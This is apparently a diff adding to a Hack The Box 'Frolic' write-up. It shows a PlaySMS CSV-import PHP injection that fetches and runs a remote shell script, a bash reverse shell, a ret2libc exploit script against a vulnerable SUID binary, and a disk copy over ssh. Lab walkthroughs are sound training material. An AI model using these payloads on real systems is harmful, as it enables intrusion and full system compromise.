@@ -172,6 +172,296 @@ PlaySMS - index.php Unauthenticated Template Injection Code Execution (Metasploi
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
-Now
+Now, after reading few exploits, we decided to choose ```php/webapps/42044.txt``` as is seems to be the easier to exploit.
+All we have to do is create the following .csv payload:
+```
+"Name","Mobile","Email","Group code","Tags"
+"<?php system('curl 10.10.14.4/shell.sh | bash'); ?> ","432674585747","","",""
+```
+create a shell.sh file
+```
+bash -c 'bash -i >& /dev/tcp/10.10.14.4/1234 0>&1'
+```
+and import the .csv payload by navigating to My Account -> Phonebook -> Import.  
+Now we run the import and get a shell as www-data
+```
+root@kali:~/Documents/HTB/Boxes/Frolic# nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.7] from (UNKNOWN) [10.10.10.111] 38224
+bash: cannot set terminal process group (1210): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@frolic:~/html/playsms$
+```
 
 ## Root
+Now that we have access as www-data, we can run linpeas.sh and enumerate the box for possible PE vectors.  
+if we go through the output we see the following:
+```
+════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════                                                                                                                                                
+╔══════════╣ SUID - Check easy privesc, exploits and write perms                                                                                                                                                                             
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                                                  
+-rwsr-xr-x 1 root root 38K Mar  6  2017 /sbin/mount.cifs                                                              
+-rwsr-xr-x 1 root root 34K Dec  1  2017 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 43K May  8  2014 /bin/ping6                                                                                                                                                                                           
+-rwsr-xr-x 1 root root 30K Jul 12  2016 /bin/fusermount                                                                                                                                                                                      
+-rwsr-xr-x 1 root root 39K May  8  2014 /bin/ping                                                                                                                                                                                            
+-rwsr-xr-x 1 root root 26K Dec  1  2017 /bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 38K May 17  2017 /bin/su                                                                       
+-rwsr-xr-x 1 root root 154K Jan 28  2017 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
+-rwsr-xr-x 1 root root 7.4K Sep 25  2018 /home/ayush/.binary/rop (Unknown SUID binary)  
+```
+As we can see, there is a suspicious executable called rop.  
+This is not marked as being a 95% PE vector, but, considering the location and the file name we can examine it.  
+So, let's download the executable and run it in gdb.
+First thing first we can check the security configurations of the binary and of the system:
+```
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+```
+Now we can check in the system if ASLR is enabled or not:
+```
+www-data@frolic:~/html/playsms$ cat /proc/sys/kernel/randomize_va_space
+0
+```
+Now,after these preliminary checks, we need to create a De Bruijn sequence using pattern create, give the input to rop and see if we get SIGSEGV.  
+```
+gdb-peda$ pattern_create 100
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+Starting program: /root/Documents/HTB/Boxes/Frolic/rop/rop 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+Download failed: Function not implemented.  Continuing without debug info for /lib/ld-linux.so.2.
+Download failed: Function not implemented.  Continuing without debug info for /root/Documents/HTB/Boxes/Frolic/rop/system-supplied DSO at 0xf7fcf000.
+Download failed: Function not implemented.  Continuing without debug info for /lib32/libc.so.6.
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x66 ('f')
+EBX: 0xffffcf80 --> 0x2
+ECX: 0xf7fa8000 --> 0x1e9d6c
+EDX: 0x0
+ESI: 0xf7fa8000 --> 0x1e9d6c
+EDI: 0xf7fa8000 --> 0x1e9d6c
+EBP: 0x31414162 ('bAA1')
+ESP: 0xffffcf50 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
+EIP: 0x41474141 ('AAGA')
+EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41474141
+[------------------------------------stack-------------------------------------]
+0000| 0xffffcf50 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
+0004| 0xffffcf54 ("2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
+0008| 0xffffcf58 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
+0012| 0xffffcf5c ("A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
+0016| 0xffffcf60 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
+0020| 0xffffcf64 ("AA4AAJAAfAA5AAKAAgAA6AAL")
+0024| 0xffffcf68 ("AJAAfAA5AAKAAgAA6AAL")
+0028| 0xffffcf6c ("fAA5AAKAAgAA6AAL")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41474141 in ?? ()
+```
+As we can see, using a pattern of 100 chars, we do get SIGSEGV at 0x41474141.  
+Now we can calculate the offset and see how many characters of padding we need to use before putting our rop payload.  
+```
+gdb-peda$ pattern_offset 0x41474141
+1095188801 found at offset: 52
+```
+So we'll need to put 52 chars before our payload.  
+Now let's exploit the stack, we will need 3 things:
+* libc address (where is it loaded)
+* libc system address
+* libc exit address
+* /bin/bash string
+so that we can execute something like system(/bin/bash).  
+Now let's dig for this information.  
+To retrive such informations we need to do the following:  
+To retrive libc address we can use ```ldd```. ldd prints the shared objects (shared libraries) required by each program or shared object specified on the command line.
+```
+www-data@frolic:/home/ayush/.binary$ ldd rop       
+        linux-gate.so.1 =>  (0xb7fda000)
+        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
+        /lib/ld-linux.so.2 (0xb7fdb000)
+```
+So, here we can see that libc is loaded at 0xb7e19000. Now, let's keep a note and gather all the informations.  
+Now we need libc system address and exit offsets from libs base address.  
+To get such informations we need to use ```readelf```.  
+readelf displays information about one or more ELF format object files.  The options control what particular information to display.  
+If we use readelf with the -s flag we can see the entries in symbol table section of the file, if it has one.  
+For reference, the symbol table it's a table that contains symbol's name and its location or address.  
+without further doing, let's read the libc symbol table for system and exit.
+```
+www-data@frolic:~/html/playsms$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -i system
+   245: 00112f20    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
+   627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
+  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
+www-data@frolic:~/html/playsms$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -i exit
+   112: 0002edc0    39 FUNC    GLOBAL DEFAULT   13 __cxa_at_quick_exit@@GLIBC_2.10
+   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
+   450: 0002edf0   197 FUNC    GLOBAL DEFAULT   13 __cxa_thread_atexit_impl@@GLIBC_2.18
+   558: 000b07c8    24 FUNC    GLOBAL DEFAULT   13 _exit@@GLIBC_2.0
+   616: 00115fa0    56 FUNC    GLOBAL DEFAULT   13 svc_exit@@GLIBC_2.0
+   652: 0002eda0    31 FUNC    GLOBAL DEFAULT   13 quick_exit@@GLIBC_2.10
+   876: 0002ebf0    85 FUNC    GLOBAL DEFAULT   13 __cxa_atexit@@GLIBC_2.1.3
+  1046: 0011fb80    52 FUNC    GLOBAL DEFAULT   13 atexit@GLIBC_2.0
+  1394: 001b2204     4 OBJECT  GLOBAL DEFAULT   33 argp_err_exit_status@@GLIBC_2.1
+  1506: 000f3870    58 FUNC    GLOBAL DEFAULT   13 pthread_exit@@GLIBC_2.0
+  1849: 000b07c8    24 FUNC    WEAK   DEFAULT   13 _Exit@@GLIBC_2.1.1
+  2108: 001b2154     4 OBJECT  GLOBAL DEFAULT   33 obstack_exit_failure@@GLIBC_2.0
+  2263: 0002e9f0    78 FUNC    WEAK   DEFAULT   13 on_exit@@GLIBC_2.0
+  2406: 000f4c80     2 FUNC    GLOBAL DEFAULT   13 __cyg_profile_func_exit@@GLIBC_2.2
+```
+The lines we want are these two:
+```
+  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
+   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
+```
+Let's note the offset and grab the next missing piece of the puzzle.  
+Now we need to grab /bin/sh string, to do so we can use ```strings``` command.  
+strings with -atx flags can a (scan for the whole file) t (radix print the offset within the file before each string) x (print the offset in hex).
+```
+www-data@frolic:~/html/playsms$ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
+ 15ba0b /bin/sh
+```
+Now that we have all the needed information, we can craft our exploit:
+```
+import struct
+
+padding = "A"*52
+libc = 0xb7e19000
+system = struct.pack('<I', libc + 0x0003ada0)
+exit = struct.pack('<I', libc + 0x0002e9d0)
+binsh = struct.pack('<I', libc + 0x0015ba0b)
+
+payload = system + exit + binsh
+
+print padding+payload
+```
+Now that we crafted our exploit we can run it against the top executable.
+```
+www-data@frolic:/home/ayush/.binary$ ./rop $(python /dev/shm/exploit.py)
+# id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+```
+as we can see we managed to root this box.
+
+## Forensics
+### Searching in the Device Block
+Since we are Curios, let's try to see if we can find the source core of rop.c to study the content.  
+Since when we run the command without any argument, we get this message:
+```
+root@frolic:/home/ayush/.binary# ./rop
+[*] Usage: program <message>
+```
+We can assume that this text is present in the original source code, lo let's try to find it in the block device /dev/sda1
+```
+root@frolic:/home/ayush/.binary# grep -a 'Usage: program <message>' -A10 -B10 /dev/sda1
+grep: memory exhausted
+```
+So, it seems like we cannot grep into whole device.  
+Let's try the following with strings:
+```
+root@frolic:/home/ayush/.binary# strings /dev/sda1 | grep 'Usage: program <message>' -A10 -B10
+#include <stdio.h>                                                                                
+#include <stdlib.h>
+
+int main(int argc, char *argv[])
+{                                                                 
+    setuid(0);                                                                                          
+    if (argc < 2)
+    {                                                                                                                 
+        printf("[*] Usage: program <message>\n");                                                                     
+        return -1;                                                                                                    
+    }                                            
+    vuln(argv[1]);   
+    return 0;                                                                                                         
+}
+void vuln(char * arg)                                                                                                 
+{
+    char text[40];                                                                                                    
+    strcpy(text, arg);                                                                                                
+    printf("[+] Message sent: ");          
+    printf(text);
+}
+```
+Running this command we can see a bunch of output and the original source code in the middle.  
+Now if we want to compile the source, we'll need the exact arguments for gcc.  
+let's search in the user's bash history:
+```
+root@frolic:/home# grep gcc ayush/.bash_history
+gcc -m32 -fno-stack-protector -no-pie -o file rop.c
+```
+now with this command we can compile the source and get the exact executable.  
+
+### Disk Recovery - Unallocated Space Analysis
+Since we now have access as root, there is another method that we can use in order to recover files.  
+We can download the whole disk to our local machine using the following command:
+```
+[root@kali Frolic ]$ ssh $TARGET "dd if=/dev/sda | gzip -1 -" | dd of=frolic.gz
+```
+this command says: connect to target and dd /dev/sda, pipe it over gzip with fast encryption (-1) and send it over standard output.  
+The output of this command will write to our shell output the disk content.  
+Now, we can pipe the output to dd and wtite the disk .gz file.  
+Once we have downloaded the disk, we can decompress:
+```
+[root@kali Frolic ]$ gzip -d frolic.gz
+```
+now we can run:
+```
+[root@kali Frolic ]$ photorec frolic
+```
+follow the instructions and see the linux partitions.  
+At the step below, we can examine the unallocated files only, as examine the whole disk will take forever.  
+```                                                                                                 
+ 1 * Linux                    0  32 33  1180 221  1   18968576                                                                                                                                                                               
+
+
+Please choose if all space needs to be analysed:                                                                                                                                                                                             
+>[   Free    ] Scan for file from ext2/ext3 unallocated space only                                                                                                                                                                           
+ [   Whole   ] Extract files from whole partition  
+```
+Now, we can choose the destination directory where disk will be recovered and wait for photorec to finish.  
+When the recovery is complete we can go to the recovery directory and grep for the following:
+```
+[root@kali photorec ]$ grep -R '<message>' .
+grep: ./recup_dir.2/f13250792.elf: binary file matches
+./recup_dir.2/f4776808.php:             $xml .= '<message>' . $message . '</message>' . "\n";
+grep: ./recup_dir.2/f13250816.elf: binary file matches
+./recup_dir.2/f13250776.c:        printf("[*] Usage: program <message>\n");
+./recup_dir.2/f13250784.txt:    .string "[*] Usage: program <message>"
+```
+as we can see, we do get few matches. The most intresting one is ```./recup_dir.2/f13250776.c```.  
+if we cat the file, we can see that we obtain the original source code. (The same code obtained by searching in the device block)
+```
+[root@kali photorec ]$ cat ./recup_dir.2/f13250776.c          
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[])
+{
+    setuid(0);    
+
+    if (argc < 2)
+    {
+        printf("[*] Usage: program <message>\n");
+        return -1;
+    }
+
+    vuln(argv[1]);
+
+    return 0;
+}
+
+void vuln(char * arg)
+{
+    char text[40];
+    strcpy(text, arg);
+
+    printf("[+] Message sent: ");
+    printf(text);
+}
+```
